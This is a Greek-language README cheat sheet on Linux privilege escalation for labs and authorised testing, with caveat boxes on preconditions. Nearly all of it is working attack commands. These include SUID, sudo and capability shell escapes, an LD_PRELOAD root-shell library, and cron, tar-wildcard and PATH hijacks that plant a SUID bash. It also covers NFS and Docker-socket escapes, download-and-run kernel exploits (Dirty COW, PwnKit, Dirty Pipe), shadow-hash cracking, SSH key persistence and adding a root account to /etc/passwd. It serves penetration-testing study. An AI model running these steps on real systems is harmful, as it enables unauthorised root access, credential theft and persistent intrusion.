# 🐧 Linux — Πλήρης οδηγός κλιμάκωσης προνομίων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Οδηγός ελέγχων κλιμάκωσης προνομίων σε Linux</b>
</p>

---

## Πριν ξεκινήσετε

Η **κλιμάκωση προνομίων (privilege escalation)** είναι η μετάβαση από τα αρχικά δικαιώματα σε ισχυρότερα δικαιώματα, λόγω λανθασμένης ρύθμισης ή ευπάθειας. Στο Linux, ο **root** είναι ο προνομιούχος χρήστης με UID 0. Πρώτα καταγράφετε ποιος είστε, ποιες διεργασίες εκτελούνται και ποια αρχεία ή ενέργειες μπορείτε να επηρεάσετε.

**Βασικοί όροι:** UID/GID = αναγνωριστικά χρήστη/ομάδας, permissions = δικαιώματα πρόσβασης, SUID/SGID = ειδικά bits που επηρεάζουν την ταυτότητα κατά την εκτέλεση, capability = επιμέρους προνόμιο, sudo = εκτέλεση επιτρεπόμενων εντολών με άλλη ταυτότητα, PATH = σειρά φακέλων αναζήτησης εντολών, cron = προγραμματισμένες εργασίες.

Μια ένδειξη δεν είναι απόδειξη: χρειάζονται κατάλληλος ιδιοκτήτης, δικαιώματα, έκδοση και πραγματική ακολουθία εκτέλεσης. Τα παραδείγματα αφορούν εργαστήρια ή εγκεκριμένους ελέγχους και περιλαμβάνουν αλλαγές κατάστασης. Οι αρχικές εντολές και τα δεδομένα διατηρούνται· δεν εκτελούνται κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [Συλλογή πληροφοριών](#section-01)
- [Ειδικά δικαιώματα SUID/SGID](#section-02)
- [Επιμέρους προνόμια εκτελέσιμων (Capabilities)](#section-03)
- [Έλεγχοι δικαιωμάτων sudo](#section-04)
- [Προγραμματισμένες εργασίες cron](#section-05)
- [Κατάχρηση της διαδρομής αναζήτησης εντολών (PATH Hijacking)](#section-06)
- [Αντιστοίχιση root σε NFS (root squashing)](#section-07)
- [Εκμετάλλευση ευπαθειών του πυρήνα (Kernel)](#section-08)
- [Αναζήτηση αποθηκευμένων διαπιστευτηρίων](#section-09)
- [Κλειδιά SSH](#section-10)
- [Τροποποιήσιμα αρχεία](#section-11)
- [Έλεγχοι απομόνωσης Docker](#section-12)
- [Γρήγορη αναφορά](#section-13)
- [Πηγές](#section-14)

---

<a id="section-01"></a>

## 🔍 Συλλογή πληροφοριών

### Πληροφορίες συστήματος

```bash
# Όνομα συστήματος
hostname

# Λειτουργικό σύστημα και πυρήνας
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Αρχιτεκτονική
arch
uname -m

# Πληροφορίες επεξεργαστή
cat /proc/cpuinfo
lscpu
```

### Πληροφορίες χρήστη

```bash
# Τρέχων χρήστης
whoami
id

# Όλοι οι χρήστες
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Ομάδες χρήστη
groups
cat /etc/group

# Συνδεδεμένοι χρήστες
w
who
users

# Προηγούμενες συνδέσεις
last
lastlog

# Δικαιώματα sudo
sudo -l
```

### Πληροφορίες δικτύου

```bash
# Διευθύνσεις IP
ip a
ifconfig

# Διαδρομές δικτύου
ip route
route -n

# Θύρες σε ακρόαση
netstat -tulpn
ss -tulpn

# Ενεργές συνδέσεις
netstat -an
ss -an

# Προσωρινός πίνακας ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Τοπικές αντιστοιχίσεις ονομάτων
cat /etc/hosts
```

### Διεργασίες και υπηρεσίες

```bash
# Διεργασίες σε εκτέλεση
ps aux
ps -ef
ps aux | grep root

# Υπηρεσίες
systemctl list-units --type=service
service --status-all

# Εγκατεστημένα πακέτα
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Προγραμματισμένες εργασίες

```bash
# Πίνακες εργασιών cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Χρονοπρογραμματιστές systemd
systemctl list-timers
```

---

<a id="section-02"></a>

## 🔐 Ειδικά δικαιώματα SUID/SGID

> **Όχι αυτόματη πρόσβαση root:** Το SUID εκτελεί με την ταυτότητα ιδιοκτήτη του αρχείου, που δεν είναι πάντα root· το SGID αφορά ομάδα. Nosuid mounts, περιορισμοί εκτέλεσης και προγράμματα που αποδεσμεύουν προνόμια αλλάζουν το αποτέλεσμα. Το Linux δεν εφαρμόζει γενικά SUID σε scripts με interpreter. Τα παραδείγματα vim, perl, less και παλιού nmap δεν είναι ισοδύναμα με κάθε σύγχρονη εγκατάσταση.


### Αναζήτηση εκτελέσιμων SUID

```bash
# Αναζήτηση αρχείων SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Αναζήτηση αρχείων SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Αρχεία με οποιοδήποτε από τα δύο bits
find / -perm /6000 -type f 2>/dev/null
```

### Συνήθη εκτελέσιμα SUID που χρειάζονται διερεύνηση

Συμβουλευτείτε το [GTFOBins](https://gtfobins.github.io/) για δυνατότητες και προϋποθέσεις κάθε εκτελέσιμου.

#### **bash**
```bash
# Αν το bash έχει SUID και πληρούνται οι υπόλοιπες προϋποθέσεις
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** — παλιές εκδόσεις
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**

> **Ελλιπές αρχικό παράδειγμα:** Η εντολή echo χρησιμοποιεί μονά εισαγωγικά, επομένως το κείμενο αντικατάστασης εντολής δεν παράγει εκεί hash. Επίσης δεν δημιουργείται αρχικά το /tmp/passwd που θα αντιγραφεί πίσω. Η ακολουθία δεν πρέπει να θεωρείται έτοιμη διαδικασία αλλαγής λογαριασμών.

```bash
# Παράδειγμα αντιγραφής και αλλαγής /etc/passwd· η ακολουθία παρακάτω είναι ελλιπής
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

<a id="section-03"></a>

## ⚡ Επιμέρους προνόμια εκτελέσιμων (Capabilities)

> **Επιμέρους προνόμια:** Η ύπαρξη capability δεν συνεπάγεται αυτόματα shell root. Εξετάστε effective/permitted σύνολα, namespaces, περιορισμούς και τη λειτουργία του προγράμματος. Το CAP_NET_RAW δεν είναι γενικό προνόμιο αλλαγής ταυτότητας. Το CAP_DAC_READ_SEARCH παρακάμπτει συγκεκριμένους ελέγχους αρχείων, όχι κάθε μηχανισμό προστασίας. Δείτε το [εγχειρίδιο capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).


### Αναζήτηση capabilities

```bash
# Ανάγνωση capabilities αρχείων
getcap -r / 2>/dev/null

# Capabilities που χρειάζονται διερεύνηση
# CAP_SETUID — αλλαγή αναγνωριστικού χρήστη UID
# CAP_NET_RAW — χρήση raw sockets
# CAP_DAC_READ_SEARCH — παράκαμψη ελέγχων DAC ανάγνωσης και αναζήτησης καταλόγων
```

### Παραδείγματα αξιοποίησης capabilities

#### **Python με cap_setuid**
```bash
# Αν το python έχει cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl με cap_setuid**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar με cap_dac_read_search**
```bash
# Ανάγνωση αρχείου με παράκαμψη των αντίστοιχων ελέγχων DAC
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim με cap_setuid**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

<a id="section-04"></a>

## 🔑 Έλεγχοι δικαιωμάτων sudo

> **Η πολιτική είναι συγκεκριμένη:** Το sudo -l περιγράφει επιτρεπόμενο χρήστη, εντολές, ορίσματα και κανόνες περιβάλλοντος. Μια εγγραφή NOPASSWD ή root δεν σημαίνει ότι επιτρέπεται κάθε εντολή. Το παράδειγμα LD_PRELOAD απαιτεί οι πραγματικοί κανόνες sudo και loader να δέχονται τη μεταβλητή και το επιλεγμένο πρόγραμμα.


### Έλεγχος δικαιωμάτων sudo

```bash
sudo -l
# Εξέταση εγγραφών NOPASSWD
# Εξέταση εγγραφών με (ALL) ή (root)
```

### Παραδείγματα δικαιωμάτων sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Αν η πολιτική sudo διατηρεί το LD_PRELOAD μέσω env_keep
# Δημιουργία βιβλιοθήκης του εργαστηριακού παραδείγματος

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** — παλιά διαδραστική λειτουργία
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Μπορεί να εμφανίσει μέρος του shadow ως σφάλμα αν το πρόγραμμα έχει πρόσβαση
```

### Ιστορικές ευπάθειες sudo

> **Έκδοση και πραγματική έκθεση:** Οι εκδόσεις του πρωτοτύπου είναι ιστορικές ενδείξεις· διανομές μπορεί να έχουν ενσωματώσει διορθώσεις χωρίς αλλαγή του βασικού αριθμού. Η CVE-2019-14287 απαιτεί συγκεκριμένη πολιτική Runas. Η γραμμή sudoedit για Baron Samedit δεν είναι πλήρες exploit και ένα σφάλμα δεν αποδεικνύει κλιμάκωση.


```bash
# Έλεγχος έκδοσης
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

<a id="section-05"></a>

## ⏰ Προγραμματισμένες εργασίες cron

> **Ταυτότητα και διαδρομές:** Η εργασία πρέπει να εκτελείται με ισχυρότερα δικαιώματα και να χρησιμοποιεί πράγματι το τροποποιήσιμο script ή το ελεγχόμενο PATH. Τα παραδείγματα wildcard του tar απαιτούν συγκεκριμένο κατάλογο εργασίας και κατάλληλη ερμηνεία ορισμάτων. Η ύπαρξη cron από μόνη της δεν αποτελεί αδυναμία.


### Αναζήτηση εργασιών cron

```bash
# Αρχείο προγραμματισμένων εργασιών συστήματος
cat /etc/crontab

# Κατάλογοι προγραμματισμένων εργασιών cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Πίνακες cron χρηστών
cat /var/spool/cron/crontabs/*

# Παρακολούθηση εργασιών cron
# Χρήση pspy για παρακολούθηση διεργασιών
```

### Παραδείγματα μη ασφαλών εργασιών cron

#### **Τροποποιήσιμο script cron**
```bash
# Αν το cron εκτελεί script που μπορείτε να τροποποιήσετε:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Μετά την εκτέλεση της εργασίας cron:
/tmp/bash -p
```

#### **Εισαγωγή επιλογών μέσω wildcard στο tar**
```bash
# Αν το cron εκτελεί: tar czf /tmp/backup.tar.gz *

# Δημιουργία αρχείων του εργαστηριακού παραδείγματος
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Μη ασφαλής χρήση PATH**
```bash
# Αν το cron χρησιμοποιεί αναζήτηση μέσω PATH που μπορείτε να επηρεάσετε
# Το crontab ορίζει: PATH=/home/user:/usr/local/bin:...
# Το script καλεί backup.sh χωρίς πλήρη διαδρομή

# Δημιουργία δοκιμαστικού script σε τροποποιήσιμο φάκελο PATH
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="section-06"></a>

## 🛤️ Κατάχρηση της διαδρομής αναζήτησης εντολών (PATH Hijacking)

### Αναζήτηση scripts που χρειάζονται έλεγχο

```bash
# Αναζήτηση scripts του root με μη πλήρεις διαδρομές εντολών
# Έλεγχος σχετικών scripts· το Linux δεν εφαρμόζει γενικά SUID σε ερμηνευόμενα scripts
# Έλεγχος scripts cron
# Έλεγχος υπηρεσιών systemd
```

### Παράδειγμα μη ασφαλούς αναζήτησης μέσω PATH

```bash
# Αν script του root καλεί το service χωρίς πλήρη διαδρομή
# και μπορείτε να επηρεάσετε το PATH:

# Δημιουργία δοκιμαστικού αρχείου με όνομα service
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Εκτέλεση του script του εργαστηριακού παραδείγματος
./vulnerable_script
```

---

<a id="section-07"></a>

## 📁 Αντιστοίχιση root σε NFS (root squashing)

> **Πρόσθετες προϋποθέσεις:** Το no_root_squash δεν αρκεί χωρίς πρόσβαση στο export, δικαίωμα εγγραφής και διατήρηση των σχετικών ιδιοκτητών/bits. Η εκτέλεση SUID στο σύστημα που καταναλώνει το αρχείο μπορεί να εμποδίζεται από nosuid ή άλλους περιορισμούς.


### Αναζήτηση κοινόχρηστων NFS

```bash
# Στο σύστημα ελέγχου
showmount -e target_ip

# Έλεγχος εξαγόμενων κοινόχρηστων NFS
cat /etc/exports
# Αναζήτηση no_root_squash
```

### Παράδειγμα ρύθμισης no_root_squash

```bash
# Στο σύστημα ελέγχου ως root:
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Στο σύστημα-στόχο:
/share/bash -p
```

---

<a id="section-08"></a>

## 💣 Εκμετάλλευση ευπαθειών του πυρήνα (Kernel)

> **Ο πίνακας αναμειγνύει κατηγορίες:** Το PwnKit αφορά polkit/pkexec και το Baron Samedit το sudo, όχι ευπάθειες πυρήνα. Τα εύρη εκδόσεων είναι συνοπτικά και δεν λαμβάνουν υπόψη όλες τις διορθώσεις. Στο Dirty COW το wget δεν αποθηκεύει απαραίτητα αρχείο με το όνομα 40839.c που περιμένει το gcc. Δείτε την [αρχική ανακοίνωση PwnKit της Qualys](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt).


### Έλεγχος έκδοσης πυρήνα

```bash
uname -r
uname -a
cat /proc/version
```

### Ενδεικτικές ιστορικές ευπάθειες πυρήνα και λογισμικού

| CVE | Έκδοση πυρήνα ή επηρεαζόμενου λογισμικού | Όνομα |
| ----- | ---------------- | ------ |
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Ευάλωτες εκδόσεις polkit/pkexec· δεν είναι σφάλμα πυρήνα | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Λήψη και μεταγλώττιση κατά το πρωτότυπο
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Λήψη
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Πρώτα έλεγχος έκδοσης και ενημερώσεων πυρήνα
uname -r

# Λήψη και μεταγλώττιση κατά το πρωτότυπο
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

<a id="section-09"></a>

## 🔑 Αναζήτηση αποθηκευμένων διαπιστευτηρίων

### Αναζήτηση πιθανών κωδικών

```bash
# Μέσα σε αρχεία
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Αρχεία ρυθμίσεων
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Αρχεία ιστορικού εντολών
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Περιβάλλον
env
printenv
```

### Αρχεία κωδικών και hashes

```bash
# Αρχείο shadow· απαιτείται κατάλληλη πρόσβαση
cat /etc/shadow

# Hashes κωδικών από το shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Συνήθεις τοποθεσίες

```bash
# Ρυθμίσεις εφαρμογών web
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Ρυθμίσεις βάσεων δεδομένων
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Αντίγραφα ασφαλείας
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

<a id="section-10"></a>

## 🔐 Κλειδιά SSH

> **Το κλειδί χρειάζεται αντιστοίχιση:** Αναγνώσιμο ιδιωτικό κλειδί δεν εγγυάται σύνδεση. Χρειάζεται αντίστοιχο εξουσιοδοτημένο δημόσιο κλειδί, επιτρεπόμενος λογαριασμός, ενδεχόμενο passphrase και συμβατή πολιτική SSH. Προσθήκη στο authorized_keys αλλάζει μόνιμα την πρόσβαση μέχρι να αναιρεθεί.


### Αναζήτηση κλειδιών SSH

```bash
# Ιδιωτικά κλειδιά
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Εγκεκριμένα δημόσια κλειδιά
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Έλεγχος χρήσης αναγνώσιμου κλειδιού SSH

```bash
# Αν βρεθεί αναγνώσιμο ιδιωτικό κλειδί:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Προσθήκη δικού σας κλειδιού SSH

```bash
# Δημιουργία κλειδιού στο σύστημα ελέγχου
ssh-keygen -t rsa -b 4096

# Αν μπορείτε να γράψετε στο authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

<a id="section-11"></a>

## 📝 Τροποποιήσιμα αρχεία

### Κρίσιμα αρχεία με δικαίωμα εγγραφής

```bash
# Έλεγχος δικαιώματος εγγραφής
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Παράδειγμα τροποποιήσιμου /etc/passwd

```bash
# Παραγωγή σύνοψης κωδικού (hash)
openssl passwd -1 -salt hacker password
# Έξοδος παραδείγματος: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Παράδειγμα προσθήκης χρήστη με δικαιώματα root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Σύνδεση
su hacker
# Κωδικός παραδείγματος: password
```

### Αναζήτηση αρχείων με δικαίωμα εγγραφής

> **Τα κριτήρια διαφέρουν:** Το -writable εξετάζει τη δυνατότητα εγγραφής του τρέχοντος χρήστη. Το -perm -222 απαιτεί όλα τα συγκεκριμένα bits εγγραφής. Το -perm -o+w ελέγχει το bit εγγραφής για άλλους. Δεν είναι τρεις ισοδύναμοι τρόποι επιλογής του ίδιου συνόλου.


```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Έλεγχος εγγράψιμων καταλόγων· τα κριτήρια των εντολών διαφέρουν
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

<a id="section-12"></a>

## 🐳 Έλεγχοι απομόνωσης Docker

> **Ποιος daemon και ποιος host:** Socket, hostname ή .dockerenv δεν αρκούν ως απόδειξη διαφυγής. Η δυνατότητα πρόσβασης στον Docker daemon, τα δικαιώματά του, rootless λειτουργία, namespaces και οι προσαρτήσεις καθορίζουν τον αντίκτυπο. Το /dev/sda1 δεν είναι γενική διαδρομή δίσκου host και η προσάρτηση μπορεί να αλλάξει δεδομένα.


### Ενδείξεις εκτέλεσης μέσα σε Docker

```bash
# Έλεγχος ύπαρξης .dockerenv
ls -la /.dockerenv

# Έλεγχος cgroups
cat /proc/1/cgroup | grep docker

# Έλεγχος hostname· η μορφή του είναι μόνο ένδειξη
hostname
```

### Προσάρτηση socket Docker

```bash
# Αν το docker.sock είναι προσαρτημένο
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Παράδειγμα χρήσης socket Docker προς τον host του daemon
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Container με εκτεταμένα προνόμια

```bash
# Αν το container έχει αυξημένα προνόμια
fdisk -l                    # Εμφάνιση διαθέσιμων δίσκων· όχι αυτόματη απόδειξη πρόσβασης στον host
mount /dev/sda1 /mnt
chroot /mnt
```

---

<a id="section-13"></a>

## 📊 Γρήγορη αναφορά

### Συλλογή πληροφοριών με σύντομες εντολές

```bash
# Σύντομες πληροφορίες συστήματος
id; hostname; uname -a; cat /etc/issue

# Σύντομος έλεγχος SUID
find / -perm -4000 -type f 2>/dev/null

# Σύντομος έλεγχος capabilities
getcap -r / 2>/dev/null

# Σύντομος έλεγχος sudo
sudo -l

# Σύντομος έλεγχος cron
cat /etc/crontab; ls -la /etc/cron*

# Σύντομη αναζήτηση πιθανών κωδικών
grep -r "password" /home/ 2>/dev/null
```

### Αυτοματοποιημένα εργαλεία

| Εργαλείο | Περιγραφή |
| ------ | ------------- |
| **LinPEAS** | Αναλυτική συλλογή πληροφοριών συστήματος |
| **LinEnum** | Συλλογή πληροφοριών Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Παρακολούθηση διεργασιών |

### Λίστα αρχικών σημείων διερεύνησης

- [ ] `sudo -l` — έλεγχος δικαιωμάτων sudo
- [ ] Εκτελέσιμα SUID — αναζήτηση και έλεγχος προϋποθέσεων στο GTFOBins
- [ ] Δυνατότητες αρχείων (capabilities) — `getcap -r / 2>/dev/null`
- [ ] Εργασίες cron — υπάρχουν τροποποιήσιμα scripts;
- [ ] Έκδοση και ενημερώσεις πυρήνα — γνωστές ευπάθειες;
- [ ] Αναγνώσιμο /etc/shadow
- [ ] Δυνατότητα εγγραφής στο /etc/passwd
- [ ] Κλειδιά SSH στο /home/* ή στο /root
- [ ] Προσαρτημένο socket Docker
- [ ] Κοινόχρηστο NFS με no_root_squash

---

<a id="section-14"></a>

## 📚 Πηγές

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — κλιμάκωση προνομίων Linux](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Σχετικοί οδηγοί
- [LinPEAS — επίσημο αποθετήριο](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Κλιμάκωση προνομίων Windows](../../Windows-PrivEsc/translations/README.el.md)

---

<p align="center">
  <b>🐧 Κατανοήστε τα δικαιώματα πρόσβασης στο Linux!</b><br>
  <i>Μεθοδική διερεύνηση κλιμάκωσης προνομίων Linux</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
